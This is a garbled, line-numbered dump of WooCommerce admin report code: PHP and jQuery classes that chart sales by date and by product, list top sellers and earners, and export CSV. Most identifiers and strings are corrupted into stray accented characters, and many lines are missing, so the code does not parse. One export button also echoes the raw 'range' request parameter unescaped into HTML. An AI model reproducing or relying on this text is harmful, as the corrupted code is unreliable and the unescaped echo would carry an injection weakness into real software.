 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

58 'd©a' => 
	`¬¿y
(

59 'discouÁ_amouÁ' => 
	`¬¿y
(

66 'wh”e' => 
	`¬¿y
(

67 
	`¬¿y
(

74 'f‹r_¿nge' => 
Œue


77 
$this
->
av”age_§Ës
 = 
$tÙ®_§Ës
 / ( $this->
ch¬t_š‹rv®
 + 1 );

79  
$this
->
ch¬t_groupby
 ) {

81 
$av”age_§Ës_t™Ë
 = 
	`¥rštf
Ğ
	`__
Ğ'% av”agday s®es', 'woocomm”û' ), '<¡rÚg>' . 
	`wc_´iû
Ğ
$this
->
av”age_§Ës
 ) . '</strong>' );

84 
$av”age_§Ës_t™Ë
 = 
	`¥rštf
Ğ
	`__
Ğ'% av”agmÚthly s®es', 'woocomm”û' ), '<¡rÚg>' . 
	`wc_´iû
Ğ
$this
->
av”age_§Ës
 ) . '</strong>' );

88 
$Ëg’d
[] = 
	`¬¿y
(

89 't™Ë' => 
	`¥rštf
Ğ
	`__
Ğ'% §Ë šhi ³riod', 'woocomm”û' ), '<¡rÚg>' . 
	`wc_´iû
Ğ
$tÙ®_§Ës
 ) . '</strong>' ),

90 'cŞÜ' => 
$this
->
ch¬t_cŞours
['sales_amount'],

93 
$Ëg’d
[] = 
	`¬¿y
(

94 't™Ë' => 
$av”age_§Ës_t™Ë
,

95 'cŞÜ' => 
$this
->
ch¬t_cŞours
['average'],

98 
$Ëg’d
[] = 
	`¬¿y
(

99 't™Ë' => 
	`¥rštf
Ğ
	`__
Ğ'% Üd” ¶aûd', 'woocomm”û' ), '<¡rÚg>' . 
$tÙ®_Üd”s
 . '</strong>' ),

100 'cŞÜ' => 
$this
->
ch¬t_cŞours
['order_count'],

103 
$Ëg’d
[] = 
	`¬¿y
(

104 't™Ë' => 
	`¥rštf
Ğ
	`__
Ğ'% ™em purcha£d', 'woocomm”û' ), '<¡rÚg>' . 
$tÙ®_™ems
 . '</strong>' ),

105 'cŞÜ' => 
$this
->
ch¬t_cŞours
['item_count'],

108 
$Ëg’d
[] = 
	`¬¿y
(

109 't™Ë' => 
	`¥rštf
Ğ
	`__
Ğ'% ch¬ged fÜ shpšg', 'woocomm”û' ), '<¡rÚg>' . 
	`wc_´iû
Ğ
$tÙ®_shpšg
 ) . '</strong>' ),

110 'cŞÜ' => 
$this
->
ch¬t_cŞours
['shipping_amount'],

113 
$Ëg’d
[] = 
	`¬¿y
(

114 't™Ë' => 
	`¥rštf
Ğ
	`__
Ğ'% wÜth oàcoupÚ u£d', 'woocomm”û' ), '<¡rÚg>' . 
	`wc_´iû
Ğ
$tÙ®_coupÚs
 ) . '</strong>' ),

115 'cŞÜ' => 
$this
->
ch¬t_cŞours
['coupon_amount'],

119  
$Ëg’d
;

125 
public
 
funùiÚ
 
	$ouut_»pÜt
() {

126 
glob®
 
$woocomm”û
, 
$wpdb
, 
$wp_loÿË
;

128 
$¿nges
 = 
	`¬¿y
(

129 'y—r' => 
	`__
( 'Year', 'woocommerce' ),

130 'Ï¡_mÚth' => 
	`__
( 'Last Month', 'woocommerce' ),

131 'mÚth' => 
	`__
( 'This Month', 'woocommerce' ),

132 '7day' => 
	`__
( 'Last 7 Days', 'woocommerce' )

135 
$this
->
ch¬t_cŞours
 = 
	`¬¿y
(

144 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : '7day';

146 iàĞ! 
	`š_¬¿y
Ğ
$cu¼’t_¿nge
, 
	`¬¿y
( 'custom', 'year', 'last_month', 'month', '7day' ) ) )

147 
$cu¼’t_¿nge
 = '7day';

149 
$this
->
	`ÿlcuÏ‹_cu¼’t_¿nge
Ğ
$cu¼’t_¿nge
 );

151 
	`šşude
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/admin/views/html-report-by-date.php');

152 
	}
}

157 
public
 
funùiÚ
 
	$g‘_expÜt_bu‰Ú
() {

158 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : '7day';

160 <
a


161 
h»f
="#"

162 
dowÆßd
="report-<?phpƒcho $current_range; ?>-<?phpƒcho date_i18n( 'Y-m-d', current_time('timestamp') ); ?>.csv"

163 
şass
="export_csv"

164 
d©a
-
expÜt
="chart"

165 
d©a
-
xaxes
="<?php _e( 'Date', 'woocommerce' ); ?>"

166 
d©a
-
exşude_£r›s
="2"

167 
d©a
-
groupby
="<?phpƒcho $this->chart_groupby; ?>"

169 <?
php
 
	`_e
( 'Export CSV', 'woocommerce' ); ?>

170 </
a
>

171 <?
php


172 
	}
}

178 
public
 
funùiÚ
 
	$g‘_maš_ch¬t
() {

179 
glob®
 
$wp_loÿË
;

182 
$Üd”s
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

183 'd©a' => 
	`¬¿y
(

184 '_Üd”_tÙ®' => 
	`¬¿y
(

189 '_Üd”_shpšg' => 
	`¬¿y
(

194 'ID' => 
	`¬¿y
(

198 'di¡šù' => 
Œue
,

200 'po¡_d©e' => 
	`¬¿y
(

206 'group_by' => 
$this
->
group_by_qu”y
,

209 'f‹r_¿nge' => 
Œue


213 
$Üd”_™ems
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

214 'd©a' => 
	`¬¿y
(

215 '_qty' => 
	`¬¿y
(

221 'po¡_d©e' => 
	`¬¿y
(

227 'wh”e' => 
	`¬¿y
(

228 
	`¬¿y
(

234 'group_by' => 
$this
->
group_by_qu”y
,

237 'f‹r_¿nge' => 
Œue


241 
$coupÚs
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

242 'd©a' => 
	`¬¿y
(

243 'Üd”_™em_Çme' => 
	`¬¿y
(

248 'discouÁ_amouÁ' => 
	`¬¿y
(

254 'po¡_d©e' => 
	`¬¿y
(

260 'wh”e' => 
	`¬¿y
(

261 
	`¬¿y
(

267 'group_by' => 
$this
->
group_by_qu”y
 . ', order_item_name',

270 'f‹r_¿nge' => 
Œue


274 
$Üd”_couÁs
 = 
$this
->
	`´•¬e_ch¬t_d©a
Ğ
$Üd”s
, 'po¡_d©e', 'tÙ®_Üd”s', $this->
ch¬t_š‹rv®
, $this->
¡¬t_d©e
, $this->
ch¬t_groupby
 );

275 
$Üd”_™em_couÁs
 = 
$this
->
	`´•¬e_ch¬t_d©a
Ğ
$Üd”_™ems
, 'po¡_d©e', 'Üd”_™em_couÁ', $this->
ch¬t_š‹rv®
, $this->
¡¬t_d©e
, $this->
ch¬t_groupby
 );

276 
$Üd”_amouÁs
 = 
$this
->
	`´•¬e_ch¬t_d©a
Ğ
$Üd”s
, 'po¡_d©e', 'tÙ®_§Ës', $this->
ch¬t_š‹rv®
, $this->
¡¬t_d©e
, $this->
ch¬t_groupby
 );

277 
$coupÚ_amouÁs
 = 
$this
->
	`´•¬e_ch¬t_d©a
Ğ
$coupÚs
, 'po¡_d©e', 'discouÁ_amouÁ', $this->
ch¬t_š‹rv®
, $this->
¡¬t_d©e
, $this->
ch¬t_groupby
 );

278 
$shpšg_amouÁs
 = 
$this
->
	`´•¬e_ch¬t_d©a
Ğ
$Üd”s
, 'po¡_d©e', 'tÙ®_shpšg', $this->
ch¬t_š‹rv®
, $this->
¡¬t_d©e
, $this->
ch¬t_groupby
 );

281 
$ch¬t_d©a
 = 
	`jsÚ_’code
Ğ
	`¬¿y
(

282 'Üd”_couÁs' => 
	`¬¿y_v®ues
Ğ
$Üd”_couÁs
 ),

283 'Üd”_™em_couÁs' => 
	`¬¿y_v®ues
Ğ
$Üd”_™em_couÁs
 ),

284 'Üd”_amouÁs' => 
	`¬¿y_v®ues
Ğ
$Üd”_amouÁs
 ),

285 'coupÚ_amouÁs' => 
	`¬¿y_v®ues
Ğ
$coupÚ_amouÁs
 ),

286 'shpšg_amouÁs' => 
	`¬¿y_v®ues
Ğ
$shpšg_amouÁs
 )

289 <
div
 
şass
="chart-container">

290 <
div
 
şass
="chart-placeholder main"></div>

291 </
div
>

292 <
süt
 
ty³
="text/javascript">

294 
v¬
 
maš_ch¬t
;

296 
	`jQu”y
(
	`funùiÚ
(){

297 
v¬
 
Üd”_d©a
 = 
jQu”y
.
	`·r£JSON
( '<?phpƒcho $chart_data; ?>' );

298 
v¬
 
d¿wG¿ph
 = 
	`funùiÚ
Ğ
highlight
 ) {

299 
v¬
 
£r›s
 = [

301 
Ïb–
: "<?phpƒchoƒsc_js( __( 'Number of items sold', 'woocommerce' ) ) ?>",

302 
d©a
: 
Üd”_d©a
.
Üd”_™em_couÁs
,

303 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
™em_couÁ
']; ?>',

304 
b¬s
: { 
flCŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
™em_couÁ
']; ?>', 
fl
: 
Œue
, 
show
:rue, 
lšeWidth
: 0, 
b¬Width
: <?
php
 
echo
 
$this
->
b¬width
; ?> * 0.5, 
®ign
: 'center' },

305 
shadowSize
: 0,

306 
hov”abË
: 
çl£


309 
Ïb–
: "<?phpƒchoƒsc_js( __( 'Number of orders', 'woocommerce' ) ) ?>",

310 
d©a
: 
Üd”_d©a
.
Üd”_couÁs
,

311 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
Üd”_couÁ
']; ?>',

312 
b¬s
: { 
flCŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
Üd”_couÁ
']; ?>', 
fl
: 
Œue
, 
show
:rue, 
lšeWidth
: 0, 
b¬Width
: <?
php
 
echo
 
$this
->
b¬width
; ?> * 0.5, 
®ign
: 'center' },

313 
shadowSize
: 0,

314 
hov”abË
: 
çl£


317 
Ïb–
: "<?phpƒchoƒsc_js( __( 'Average sales‡mount', 'woocommerce' ) ) ?>",

318 
d©a
: [ [ <?
php
 
echo
 
	`mš
Ğ
	`¬¿y_keys
Ğ
$Üd”_amouÁs
 ) ); ?>, <?ph°echØ
$this
->
av”age_§Ës
; ?> ], [ <?ph°echØ
	`max
(‡rray_keys( $order_amounts ) ); ?>, <?phpƒcho $this->average_sales; ?> ] ],

319 
yaxis
: 2,

320 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
av”age
']; ?>',

321 
pošts
: { 
show
: 
çl£
 },

322 
lšes
: { 
show
: 
Œue
, 
lšeWidth
: 2, 
fl
: 
çl£
 },

323 
shadowSize
: 0,

324 
hov”abË
: 
çl£


327 
Ïb–
: "<?phpƒchoƒsc_js( __( 'Coupon‡mount', 'woocommerce' ) ) ?>",

328 
d©a
: 
Üd”_d©a
.
coupÚ_amouÁs
,

329 
yaxis
: 2,

330 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
coupÚ_amouÁ
']; ?>',

331 
pošts
: { 
show
: 
Œue
, 
¿dius
: 5, 
lšeWidth
: 3, 
flCŞÜ
: '#fff', 
fl
:rue },

332 
lšes
: { 
show
: 
Œue
, 
lšeWidth
: 4, 
fl
: 
çl£
 },

333 
shadowSize
: 0,

334 
´•’d_toŞt
: "<?phpƒcho get_woocommerce_currency_symbol(); ?>"

337 
Ïb–
: "<?phpƒchoƒsc_js( __( 'Shipping‡mount', 'woocommerce' ) ) ?>",

338 
d©a
: 
Üd”_d©a
.
shpšg_amouÁs
,

339 
yaxis
: 2,

340 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
shpšg_amouÁ
']; ?>',

341 
pošts
: { 
show
: 
Œue
, 
¿dius
: 5, 
lšeWidth
: 3, 
flCŞÜ
: '#fff', 
fl
:rue },

342 
lšes
: { 
show
: 
Œue
, 
lšeWidth
: 4, 
fl
: 
çl£
 },

343 
shadowSize
: 0,

344 
´•’d_toŞt
: "<?phpƒcho get_woocommerce_currency_symbol(); ?>"

347 
Ïb–
: "<?phpƒchoƒsc_js( __( 'Sales‡mount', 'woocommerce' ) ) ?>",

348 
d©a
: 
Üd”_d©a
.
Üd”_amouÁs
,

349 
yaxis
: 2,

350 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
§Ës_amouÁ
']; ?>',

351 
pošts
: { 
show
: 
Œue
, 
¿dius
: 5, 
lšeWidth
: 3, 
flCŞÜ
: '#fff', 
fl
:rue },

352 
lšes
: { 
show
: 
Œue
, 
lšeWidth
: 4, 
fl
: 
çl£
 },

353 
shadowSize
: 0,

354 
´•’d_toŞt
: "<?phpƒcho get_woocommerce_currency_symbol(); ?>"

358 iàĞ
highlight
 !=ğ'undefšed' && 
£r›s
[ highlight ] ) {

359 
highlight_£r›s
 = 
£r›s
[ 
highlight
 ];

361 
highlight_£r›s
.
cŞÜ
 = '#9c5d90';

363 iàĞ
highlight_£r›s
.
b¬s
 )

364 
highlight_£r›s
.
b¬s
.
flCŞÜ
 = '#9c5d90';

366 iàĞ
highlight_£r›s
.
lšes
 ) {

367 
highlight_£r›s
.
lšes
.
lšeWidth
 = 5;

371 
maš_ch¬t
 = 
jQu”y
.
	`¶Ù
(

372 
	`jQu”y
('.chart-placeholder.main'),

373 
£r›s
,

375 
Ëg’d
: {

376 
show
: 
çl£


378 
grid
: {

379 
cŞÜ
: '#aaa',

380 
bÜd”CŞÜ
: 'transparent',

381 
bÜd”Width
: 0,

382 
hov”abË
: 
Œue


384 
xaxes
: [ {

385 
cŞÜ
: '#aaa',

386 
pos™iÚ
: "bottom",

387 
tickCŞÜ
: 'transparent',

388 
mode
: "time",

389 
timefÜm©
: "<?php if ( $this->chart_groupby == 'day' )ƒcho '%d %b';ƒlseƒcho '%b'; ?>",

390 
mÚthNames
: <?
php
 
echo
 
	`jsÚ_’code
Ğ
	`¬¿y_v®ues
Ğ
$wp_loÿË
->
mÚth_abb»v
 ) ) ?>,

391 
tickL’gth
: 1,

392 
mšTickSize
: [1, "<?phpƒcho $this->chart_groupby; ?>"],

393 
fÚt
: {

394 
cŞÜ
: "#aaa"

397 
yaxes
: [

399 
mš
: 0,

400 
mšTickSize
: 1,

401 
tickDecim®s
: 0,

402 
cŞÜ
: '#d4d9dc',

403 
fÚt
: { 
cŞÜ
: "#aaa" }

406 
pos™iÚ
: "right",

407 
mš
: 0,

408 
tickDecim®s
: 2,

409 
®ignTicksW™hAxis
: 1,

410 
cŞÜ
: 'transparent',

411 
fÚt
: { 
cŞÜ
: "#aaa" }

417 
	`jQu”y
('.ch¬t-¶aûhŞd”').
	`»size
();

420 
	`d¿wG¿ph
();

422 
	`jQu”y
('.highlight_£r›s').
	`hov”
(

423 
	`funùiÚ
() {

424 
	`d¿wG¿ph
Ğ
	`jQu”y
(
this
).
	`d©a
('series') );

426 
	`funùiÚ
() {

427 
	`d¿wG¿ph
();

431 </
süt
>

432 <?
php


433 
	}
}

	@includes/admin/reports/class-wc-report-sales-by-product.php

1 <?
php


10 şas 
	cWC_R•Üt_S®es_By_Produù
 
ex‹nds
 
	mWC_Admš_R•Üt
 {

12 
public
 
	m$ch¬t_cŞours
 = 
¬¿y
();

13 
public
 
	m$´oduù_ids
 = 
¬¿y
();

18 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

19 iàĞ
	`is£t
Ğ
$_GET
['´oduù_ids'] ) && 
	`is_¬¿y
( $_GET['product_ids'] ) )

20 
$this
->
´oduù_ids
 = 
	`¬¿y_m­
Ğ'absšt', 
$_GET
['product_ids'] );

21 
	`–£if
 ( 
	`is£t
Ğ
$_GET
['product_ids'] ) )

22 
$this
->
´oduù_ids
 = 
	`¬¿y
Ğ
	`absšt
Ğ
$_GET
['product_ids'] ) );

29 
public
 
funùiÚ
 
	$g‘_ch¬t_Ëg’d
() {

30 iàĞ! 
$this
->
´oduù_ids
 )

31  
	`¬¿y
();

33 
$Ëg’d
 = 
	`¬¿y
();

35 
$tÙ®_§Ës
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

36 'd©a' => 
	`¬¿y
(

37 '_lše_tÙ®' => 
	`¬¿y
(

44 'wh”e_m‘a' => 
	`¬¿y
(

46 
	`¬¿y
(

48 'm‘a_key' => 
	`¬¿y
( '_product_id', '_variation_id' ),

49 'm‘a_v®ue' => 
$this
->
´oduù_ids
,

54 'f‹r_¿nge' => 
Œue


56 
$tÙ®_™ems
 = 
	`absšt
Ğ
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

57 'd©a' => 
	`¬¿y
(

58 '_qty' => 
	`¬¿y
(

65 'wh”e_m‘a' => 
	`¬¿y
(

67 
	`¬¿y
(

69 'm‘a_key' => 
	`¬¿y
( '_product_id', '_variation_id' ),

70 'm‘a_v®ue' => 
$this
->
´oduù_ids
,

75 'f‹r_¿nge' => 
Œue


78 
$Ëg’d
[] = 
	`¬¿y
(

79 't™Ë' => 
	`¥rštf
Ğ
	`__
Ğ'% §Ë fÜh£Ëùed i‹ms', 'woocomm”û' ), '<¡rÚg>' . 
	`wc_´iû
Ğ
$tÙ®_§Ës
 ) . '</strong>' ),

80 'cŞÜ' => 
$this
->
ch¬t_cŞours
['sales_amount'],

83 
$Ëg’d
[] = 
	`¬¿y
(

84 't™Ë' => 
	`¥rštf
Ğ
	`__
Ğ'% purcha£ fÜh£Ëùed i‹ms', 'woocomm”û' ), '<¡rÚg>' . 
$tÙ®_™ems
 . '</strong>' ),

85 'cŞÜ' => 
$this
->
ch¬t_cŞours
['item_count'],

89  
$Ëg’d
;

90 
	}
}

95 
public
 
funùiÚ
 
	$ouut_»pÜt
() {

96 
glob®
 
$woocomm”û
, 
$wpdb
, 
$wp_loÿË
;

98 
$¿nges
 = 
	`¬¿y
(

99 'y—r' => 
	`__
( 'Year', 'woocommerce' ),

100 'Ï¡_mÚth' => 
	`__
( 'Last Month', 'woocommerce' ),

101 'mÚth' => 
	`__
( 'This Month', 'woocommerce' ),

102 '7day' => 
	`__
( 'Last 7 Days', 'woocommerce' )

105 
$this
->
ch¬t_cŞours
 = 
	`¬¿y
(

110 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : '7day';

112 iàĞ! 
	`š_¬¿y
Ğ
$cu¼’t_¿nge
, 
	`¬¿y
( 'custom', 'year', 'last_month', 'month', '7day' ) ) )

113 
$cu¼’t_¿nge
 = '7day';

115 
$this
->
	`ÿlcuÏ‹_cu¼’t_¿nge
Ğ
$cu¼’t_¿nge
 );

117 
	`šşude
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/admin/views/html-report-by-date.php');

118 
	}
}

124 
public
 
funùiÚ
 
	$g‘_ch¬t_widg‘s
() {

126 
$widg‘s
 = 
	`¬¿y
();

128 iàĞ! 
	`em±y
Ğ
$this
->
´oduù_ids
 ) ) {

129 
$widg‘s
[] = 
	`¬¿y
(

130 't™Ë' => 
	`__
( 'Showing„eports for:', 'woocommerce' ),

131 'ÿÎback' => 
	`¬¿y
Ğ
$this
, 'current_filters' )

135 
$widg‘s
[] = 
	`¬¿y
(

137 'ÿÎback' => 
	`¬¿y
Ğ
$this
, 'products_widget' )

140  
$widg‘s
;

141 
	}
}

147 
public
 
funùiÚ
 
	$cu¼’t_f‹rs
() {

148 
$this
->
´oduù_ids_t™Ës
 = 
	`¬¿y
();

150 
	`fÜ—ch
 ( 
$this
->
´oduù_ids
 
as
 
$´oduù_id
 ) {

151 
$´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

152 iàĞ
$´oduù
 ) {

153 
$this
->
´oduù_ids_t™Ës
[] = 
$´oduù
->
	`g‘_fÜm©‹d_Çme
();

155 
$this
->
´oduù_ids_t™Ës
[] = '#' . 
$´oduù_id
;

159 
echo
 '<p>' . ' <¡rÚg>' . 
	`im¶ode
Ğ', ', 
$this
->
´oduù_ids_t™Ës
 ) . '</strong></p>';

160 
echo
 '<p><¨şass="bu‰Ú" h»f="' . 
	`»move_qu”y_¬g
Ğ'´oduù_ids' ) . '">' . 
	`__
( 'Reset', 'woocommerce' ) . '</a></p>';

161 
	}
}

167 
public
 
funùiÚ
 
	$´oduùs_widg‘
() {

169 <
h4
 
şass
="£ùiÚ_t™Ë"><
¥ª
><?
php
 
	`_e
( 'Product Search', 'woocommerce' ); ?></span></h4>

170 <
div
 
şass
="section">

171 <
fÜm
 
m‘hod
="GET">

172 <
div
>

173 <
£Ëù
 
id
="´oduù_ids" 
Çme
="´oduù_ids[]" 
şass
="ajax_cho£n_£Ëù_´oduùs" 
muÉË
="muÉË" 
d©a
-
¶aûhŞd”
="<?ph°_eĞ'S—rch fÜ‡…roduù&h–l;', 'woocomm”û' ); ?>" 
¡yË
="width:203px;"></select>

174 <
šput
 
ty³
="subm™" 
şass
="subm™ bu‰Ú" 
v®ue
="<?php _e( 'Show', 'woocommerce' ); ?>" />

175 <
šput
 
ty³
="hidd’" 
Çme
="¿nge" 
v®ue
="<?php if ( !ƒmpty( $_GET['range'] ) )ƒchoƒsc_attr( $_GET['range'] ) ?>" />

176 <
šput
 
ty³
="hidd’" 
Çme
="¡¬t_d©e" 
v®ue
="<?php if ( !ƒmpty( $_GET['start_date'] ) )ƒchoƒsc_attr( $_GET['start_date'] ) ?>" />

177 <
šput
 
ty³
="hidd’" 
Çme
="’d_d©e" 
v®ue
="<?php if ( !ƒmpty( $_GET['end_date'] ) )ƒchoƒsc_attr( $_GET['end_date'] ) ?>" />

178 <
šput
 
ty³
="hidd’" 
Çme
="·ge" 
v®ue
="<?php if ( !ƒmpty( $_GET['page'] ) )ƒchoƒsc_attr( $_GET['page'] ) ?>" />

179 <
šput
 
ty³
="hidd’" 
Çme
="b" 
v®ue
="<?php if ( !ƒmpty( $_GET['tab'] ) )ƒchoƒsc_attr( $_GET['tab'] ) ?>" />

180 <
šput
 
ty³
="hidd’" 
Çme
="»pÜt" 
v®ue
="<?php if ( !ƒmpty( $_GET['report'] ) )ƒchoƒsc_attr( $_GET['report'] ) ?>" />

181 </
div
>

182 <
süt
 
ty³
="text/javascript">

183 
	`jQu”y
(
	`funùiÚ
(){

185 
	`jQu”y
("£Ëù.ajax_cho£n_£Ëù_´oduùs").
	`ajaxCho£n
({

186 
m‘hod
: 'GET',

187 
u¾
: '<?ph°echØadmš_u¾('
admš
-
ajax
.
php
'); ?>',

188 
d©aTy³
: 'json',

189 
aá”Ty³D–ay
: 100,

190 
d©a
: {

191 
aùiÚ
: 'woocommerce_json_search_products_and_variations',

192 
£cur™y
: '<?phpƒcho wp_create_nonce("search-products"); ?>'

194 }, 
	`funùiÚ
 (
d©a
) {

195 
v¬
 
‹rms
 = {};

197 
jQu”y
.
	`—ch
(
d©a
, 
	`funùiÚ
 (
i
, 
v®
) {

198 
‹rms
[
i
] = 
v®
;

200  
‹rms
;

203 </
süt
>

204 </
fÜm
>

205 </
div
>

206 <
h4
 
şass
="£ùiÚ_t™Ë"><
¥ª
><?
php
 
	`_e
( 'Top Sellers', 'woocommerce' ); ?></span></h4>

207 <
div
 
şass
="section">

208 <
bË
 
ûÎ¥acšg
="0">

209 <?
php


210 
$tİ_£Î”s
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

211 'd©a' => 
	`¬¿y
(

212 '_´oduù_id' => 
	`¬¿y
(

218 '_qty' => 
	`¬¿y
(

229 'f‹r_¿nge' => 
Œue


232 iàĞ
$tİ_£Î”s
 ) {

233 
	`fÜ—ch
 ( 
$tİ_£Î”s
 
as
 
$´oduù
 ) {

234 
echo
 '<Œ cÏss="' . ( 
	`š_¬¿y
Ğ
$´oduù
->
´oduù_id
, 
$this
->
´oduù_ids
 ) ? 'active' : '' ) . '">

235 <
td
 
şass
="count">' . $product->order_item_qty . '</td>

236 <
td
 
şass
="Çme"><
a
 
h»f
="' .‡dd_query_arg( 'product_ids', $product->product_id ) . '">' . get_the_title( $product->product_id ) . '</a></td>

237 <
td
 
şass
="¥¬klše">' . $this->§Ës_¥¬klšeĞ$´oduù->´oduù_id, 7, '
couÁ
' ) . '</td>

238 </
Œ
>';

241 
echo
 '<Œ><td cŞ¥ª="3">' . 
	`__
( 'No…roducts found in„ange', 'woocommerce' ) . '</td></tr>';

244 </
bË
>

245 </
div
>

246 <
h4
 
şass
="£ùiÚ_t™Ë"><
¥ª
><?
php
 
	`_e
( 'Top Earners', 'woocommerce' ); ?></span></h4>

247 <
div
 
şass
="section">

248 <
bË
 
ûÎ¥acšg
="0">

249 <?
php


250 
$tİ_—º”s
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

251 'd©a' => 
	`¬¿y
(

252 '_´oduù_id' => 
	`¬¿y
(

258 '_lše_tÙ®' => 
	`¬¿y
(

269 'f‹r_¿nge' => 
Œue


272 iàĞ
$tİ_—º”s
 ) {

273 
	`fÜ—ch
 ( 
$tİ_—º”s
 
as
 
$´oduù
 ) {

274 
echo
 '<Œ cÏss="' . ( 
	`š_¬¿y
Ğ
$´oduù
->
´oduù_id
, 
$this
->
´oduù_ids
 ) ? 'active' : '' ) . '">

275 <
td
 
şass
="count">' . wc_price( $product->order_item_total ) . '</td>

276 <
td
 
şass
="Çme"><
a
 
h»f
="' .‡dd_query_arg( 'product_ids', $product->product_id ) . '">' . get_the_title( $product->product_id ) . '</a></td>

277 <
td
 
şass
="¥¬klše">' . $this->§Ës_¥¬klšeĞ$´oduù->´oduù_id, 7, '
§Ës
' ) . '</td>

278 </
Œ
>';

281 
echo
 '<Œ><td cŞ¥ª="3">' . 
	`__
( 'No…roducts found in„ange', 'woocommerce' ) . '</td></tr>';

284 </
bË
>

285 </
div
>

286 <
süt
 
ty³
="text/javascript">

287 
	`jQu”y
('.£ùiÚ_t™Ë').
	`şick
(
	`funùiÚ
(){

288 
v¬
 
Ãxt_£ùiÚ
 = 
	`jQu”y
(
this
).
	`Ãxt
('.section');

290 iàĞ
	`jQu”y
(
Ãxt_£ùiÚ
).
	`is
(':visible') )

291  
çl£
;

293 
	`jQu”y
('.£ùiÚ:visibË').
	`¦ideUp
();

294 
	`jQu”y
('.£ùiÚ_t™Ë').
	`»moveCÏss
('open');

295 
	`jQu”y
(
this
).
	`addCÏss
('İ’').
	`Ãxt
('.£ùiÚ').
	`¦ideDown
();

297  
çl£
;

299 
	`jQu”y
('.£ùiÚ').
	`¦ideUp
Ğ100, 
	`funùiÚ
() {

300 <?
php
 iàĞ
	`em±y
Ğ
$this
->
´oduù_ids
 ) ) : ?>

301 
	`jQu”y
('.£ùiÚ_t™Ë:eq(1)').
	`şick
();

302 <?
php
 
’dif
; ?>

304 </
süt
>

305 <?
php


306 
	}
}

311 
public
 
funùiÚ
 
	$g‘_expÜt_bu‰Ú
() {

312 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : '7day';

314 <
a


315 
h»f
="#"

316 
dowÆßd
="report-<?phpƒcho $current_range; ?>-<?phpƒcho date_i18n( 'Y-m-d', current_time('timestamp') ); ?>.csv"

317 
şass
="export_csv"

318 
d©a
-
expÜt
="chart"

319 
d©a
-
xaxes
="<?php _e( 'Date', 'woocommerce' ); ?>"

320 
d©a
-
groupby
="<?phpƒcho $this->chart_groupby; ?>"

322 <?
php
 
	`_e
( 'Export CSV', 'woocommerce' ); ?>

323 </
a
>

324 <?
php


325 
	}
}

331 
public
 
funùiÚ
 
	$g‘_maš_ch¬t
() {

332 
glob®
 
$wp_loÿË
;

334 iàĞ! 
$this
->
´oduù_ids
 ) {

336 <
div
 
şass
="chart-container">

337 <
p
 
şass
="ch¬t-´om±"><?
php
 
	`_e
( '&larr; Choose‡…roducto view stats', 'woocommerce' ); ?></p>

338 </
div
>

339 <?
php


342 
$Üd”_™em_couÁs
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

343 'd©a' => 
	`¬¿y
(

344 '_qty' => 
	`¬¿y
(

350 'po¡_d©e' => 
	`¬¿y
(

355 '_´oduù_id' => 
	`¬¿y
(

362 'wh”e_m‘a' => 
	`¬¿y
(

364 
	`¬¿y
(

366 'm‘a_key' => 
	`¬¿y
( '_product_id', '_variation_id' ),

367 'm‘a_v®ue' => 
$this
->
´oduù_ids
,

371 'group_by' => '´oduù_id,' . 
$this
->
group_by_qu”y
,

374 'f‹r_¿nge' => 
Œue


377 
$Üd”_™em_amouÁs
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

378 'd©a' => 
	`¬¿y
(

379 '_lše_tÙ®' => 
	`¬¿y
(

385 'po¡_d©e' => 
	`¬¿y
(

390 '_´oduù_id' => 
	`¬¿y
(

397 'wh”e_m‘a' => 
	`¬¿y
(

399 
	`¬¿y
(

401 'm‘a_key' => 
	`¬¿y
( '_product_id', '_variation_id' ),

402 'm‘a_v®ue' => 
$this
->
´oduù_ids
,

406 'group_by' => '´oduù_id, ' . 
$this
->
group_by_qu”y
,

409 'f‹r_¿nge' => 
Œue


413 
$Üd”_™em_couÁs
 = 
$this
->
	`´•¬e_ch¬t_d©a
Ğ$Üd”_™em_couÁs, 'po¡_d©e', 'Üd”_™em_couÁ', $this->
ch¬t_š‹rv®
, $this->
¡¬t_d©e
, $this->
ch¬t_groupby
 );

414 
$Üd”_™em_amouÁs
 = 
$this
->
	`´•¬e_ch¬t_d©a
Ğ$Üd”_™em_amouÁs, 'po¡_d©e', 'Üd”_™em_amouÁ', $this->
ch¬t_š‹rv®
, $this->
¡¬t_d©e
, $this->
ch¬t_groupby
 );

417 
$ch¬t_d©a
 = 
	`jsÚ_’code
Ğ
	`¬¿y
(

418 'Üd”_™em_couÁs' => 
	`¬¿y_v®ues
Ğ
$Üd”_™em_couÁs
 ),

419 'Üd”_™em_amouÁs' => 
	`¬¿y_v®ues
Ğ
$Üd”_™em_amouÁs
 )

422 <
div
 
şass
="chart-container">

423 <
div
 
şass
